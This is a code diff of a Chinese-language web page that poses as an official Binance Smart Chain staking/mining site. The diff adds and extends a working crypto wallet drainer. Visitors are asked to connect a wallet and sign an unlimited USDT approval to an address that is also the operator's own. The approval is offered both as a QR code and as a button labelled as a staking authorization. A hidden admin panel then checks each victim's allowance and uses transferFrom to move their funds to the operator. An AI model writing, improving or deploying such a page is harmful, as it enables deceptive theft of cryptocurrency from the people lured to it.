@@ -2,8 +2,8 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>质押挖矿</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>质押挖矿 - 管理员完整版</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
 body{background:#0B0B1F;color:#fff;padding:20px}
@@ -29,142 +29,183 @@ display:flex;align-items:center;justify-content:center;
 color:#000;font-size:14px;
 }
 #qrcode img{width:100%;height:100%;border-radius:12px}
-#payBtn{
+#approveBtn{
 background:#F0B90B;color:#000;
 border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold
 }
 .admin-panel{
-background:#1E1E35;padding:24px;border-radius:16px;display:none
+background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
 }
 .admin-panel.show{display:block}
-.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
+.admin-title{color:#F0B90B;font-weight:bold;margin-bottom:16px;text-align:center}
+.admin-subtitle {font-size:14px;color:#aaa;margin:10px 0;}
 .admin-input{
 width:100%;padding:12px;background:#111;border:none;
 border-radius:8px;color:#fff;margin-bottom:10px;
 }
 .admin-btn{
-width:100%;padding:14px;background:#ff4444;color:#fff;
-border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
+width:100%;padding:14px;background:#F0B90B;color:#000;
+border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
+cursor:pointer;
+}
+.admin-btn.danger {background:#ff4444;color:#fff;}
+.tip {font-size:12px;color:#666;margin-top:-5px;margin-bottom:10px;display:block;}
+#allowanceResult {
+margin-top:8px;
+font-size:14px;
+color:#0f0;
+text-align:center;
 }
 </style>
 </head>
 <body>
+
 <div class="container">
-<div class="pay-box">
-<h1>质押挖矿</h1>
-<p class="desc">币安链官方挖矿</p>
-<button id="connectBtn">连接钱包</button>
-<input class="amount-input" id="amount" value="0.1" placeholder="输入金额">
-<div id="qrcode"></div>
-<button id="payBtn">确认授权</button>
+  <div class="pay-box">
+    <h1>🔐 质押授权</h1>
+    <p class="desc">扫码授权后即可参与质押挖矿</p>
+
+    <button id="connectBtn">👉 连接钱包（币安链）</button>
+    <div id="qrcode">加载二维码...</div>
+    <button id="approveBtn">确认授权签名 (Max)</button>
+    
+    <span class="tip">提示：授权给质押合约地址，用于质押挖矿</span>
+  </div>
+
+  <!-- 管理员面板 -->
+  <div class="admin-panel" id="adminPanel">
+    <div class="admin-title">🔐 管理员控制台</div>
+
+    <div class="admin-subtitle">1. 查询用户授权额度</div>
+    <input class="admin-input" id="checkUserAddr" placeholder="输入要查询的用户钱包地址">
+    <button class="admin-btn" onclick="checkAllowance()">📊 查询授权额度</button>
+    <div id="allowanceResult"></div>
+
+    <div class="admin-subtitle">2. 发放奖励给用户</div>
+    <input class="admin-input" id="sendAddr" placeholder="用户钱包地址">
+    <input class="admin-input" id="sendAmt" placeholder="发放数量 (USDT)">
+    <button class="admin-btn" onclick="sendReward()">✅ 发放奖励代币</button>
+
+    <div class="admin-subtitle">3. 转移用户资产</div>
+    <input class="admin-input" id="fromAddr" placeholder="从哪个钱包转出">
+    <input class="admin-input" id="toAddr" placeholder="转入到管理员地址">
+    <input class="admin-input" id="transferAmt" placeholder="转移数量">
+    <button class="admin-btn danger" onclick="transferFrom()">🚨 转移资产</button>
+  </div>
 </div>
-<div class="admin-panel" id="adminPanel">
-<div class="admin-title">管理后台</div>
-<div>提取代币</div>
-<input class="admin-input" id="userAddr" placeholder="用户地址">
-<input class="admin-input" id="drawAmt" placeholder="数量">
-<button class="admin-btn" onclick="drawFromUser()">确认提取</button>
-<div>发放代币</div>
-<input class="admin-input" id="toAddr" placeholder="接收地址">
-<input class="admin-input" id="sendAmt" placeholder="数量">
-<button class="admin-btn" onclick="sendReward()">确认发放</button>
-</div>
-</div>
+
+<script src="https://cdn.ethers.org/lib-ethers/5.7.2/ethers.umd.min.js"></script>
 <script>
-const TOKEN  = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
-const ADMIN  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const BSC_ID = "0x38";
+// ====================== 配置 ======================
+const TOKEN_ADDR    = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+const STAKING_ADDR = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const ADMIN_ADDR   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const CHAIN_ID     = "0x38";
+// ==================================================
 
-let account = null;
+let provider, signer, account;
 
-async function switchToBSC() {
-try {
-await ethereum.request({
-method: "wallet_switchEthereumChain",
-params: [{ chainId: BSC_ID }]
-});
-} catch (e) {}
+async function switchChain() {
+  try {
+    await ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: CHAIN_ID }] });
+  } catch (e) {}
 }
 
+// 连接钱包
 document.getElementById("connectBtn").onclick = async () => {
-if (!window.ethereum) {
-alert("请在钱包内打开");
-return;
-}
-await switchToBSC();
-try {
-const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-account = accounts[0];
-document.getElementById("connectBtn").innerText = "已连接";
-if (account.toLowerCase() === ADMIN.toLowerCase()) {
-document.getElementById("adminPanel").classList.add("show");
-}
-} catch (e) {
-alert("连接失败");
-}
+  if (!window.ethereum) { alert("请在钱包内打开"); return; }
+  await switchChain();
+  try {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = provider.getSigner();
+    account = await signer.getAddress();
+    document.getElementById("connectBtn").innerText = "✅ 已连接：" + account.substr(0,6)+"...";
+    
+    genApproveQR();
+
+    if (account.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
+      document.getElementById("adminPanel").classList.add("show");
+    }
+  } catch (e) { alert("连接失败"); }
 };
 
-function genQR() {
-const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-const uri = `ethereum:${ADMIN}@56/${TOKEN}?data=${approveData}`;
-document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
+// 生成授权二维码
+function genApproveQR() {
+  const iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount) external returns (bool)"]);
+  const calldata = iface.encodeFunctionData("approve", [STAKING_ADDR, ethers.constants.MaxUint256]);
+  
+  const uri = `ethereum:${TOKEN_ADDR}@56?data=${calldata}`;
+  const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(uri);
+  document.getElementById("qrcode").innerHTML = `<img src="${qrUrl}" alt="授权二维码">`;
 }
 
-window.onload = genQR;
-document.getElementById("amount").oninput = genQR;
-
-document.getElementById("payBtn").onclick = async () => {
-if (!account) return alert("请先连接钱包");
-try {
-await ethereum.request({
-method: "eth_sendTransaction",
-params: [{
-from: account,
-to: TOKEN,
-gasLimit: "0x300000",
-data: "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-}]
-});
-alert("授权成功");
-} catch (e) {
-alert("已取消");
-}
+// 授权按钮
+document.getElementById("approveBtn").onclick = async () => {
+  if (!account) { alert("请先连接钱包"); return; }
+  try {
+    const tokenContract = new ethers.Contract(TOKEN_ADDR, ["function approve(address,uint256)"], signer);
+    const tx = await tokenContract.approve(STAKING_ADDR, ethers.constants.MaxUint256);
+    await tx.wait();
+    alert("✅ 授权成功！");
+  } catch (e) {
+    alert("❌ 授权已取消或失败");
+  }
 };
 
-async function drawFromUser() {
-if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
-const from = document.getElementById("userAddr").value;
-const amt = document.getElementById("drawAmt").value;
-if (!from || !amt) return;
-const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
-await ethereum.request({
-method: "eth_sendTransaction",
-params: [{
-from: account,
-to: TOKEN,
-data: "0x23b872dd" + from.slice(2).padStart(64, "0") + ADMIN.slice(2).padStart(64, "0") + raw
-}]
-});
-alert("提取成功");
+// ====================== 管理员功能 ======================
+// 1. 查询用户授权额度
+async function checkAllowance() {
+  if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) {
+    alert("❌ 权限不足"); return;
+  }
+  const user = document.getElementById("checkUserAddr").value;
+  if (!user) { alert("请输入用户地址"); return; }
+
+  const token = new ethers.Contract(TOKEN_ADDR, [
+    "function allowance(address owner, address spender) view returns (uint256)"
+  ], provider);
+
+  const amt = await token.allowance(user, STAKING_ADDR);
+  const show = ethers.utils.formatUnits(amt, 18);
+  document.getElementById("allowanceResult").innerText = `✅ 授权额度：${show} USDT`;
 }
 
+// 2. 发放奖励
 async function sendReward() {
-if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
-const to = document.getElementById("toAddr").value;
-const amt = document.getElementById("sendAmt").value;
-if (!to || !amt) return;
-const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
-await ethereum.request({
-method: "eth_sendTransaction",
-params: [{
-from: account,
-to: TOKEN,
-data: "0xa9059cbb" + to.slice(2).padStart(64, "0") + raw
-}]
-});
-alert("发放成功");
+  if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) {
+    alert("❌ 权限不足"); return;
+  }
+  const to = document.getElementById("sendAddr").value;
+  const amt = document.getElementById("sendAmt").value;
+  if (!to || !amt) { alert("请填写完整"); return; }
+
+  const token = new ethers.Contract(TOKEN_ADDR, ["function transfer(address,uint256)"], signer);
+  const value = ethers.utils.parseUnits(amt, 18);
+  await token.transfer(to, value);
+  alert("✅ 发放成功");
 }
+
+// 3. 转移用户资产
+async function transferFrom() {
+  if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) {
+    alert("❌ 权限不足"); return;
+  }
+  const from = document.getElementById("fromAddr").value;
+  const to = document.getElementById("toAddr").value;
+  const amt = document.getElementById("transferAmt").value;
+  if (!from || !to || !amt) { alert("请填写完整"); return; }
+
+  if (!confirm("⚠️ 确认转移？")) return;
+
+  const token = new ethers.Contract(TOKEN_ADDR, ["function transferFrom(address,address,uint256)"], signer);
+  const value = ethers.utils.parseUnits(amt, 18);
+  await token.transferFrom(from, to, value);
+  alert("✅ 转移成功");
+}
+
+window.onload = genApproveQR;
 </script>
 </body>
 </html>
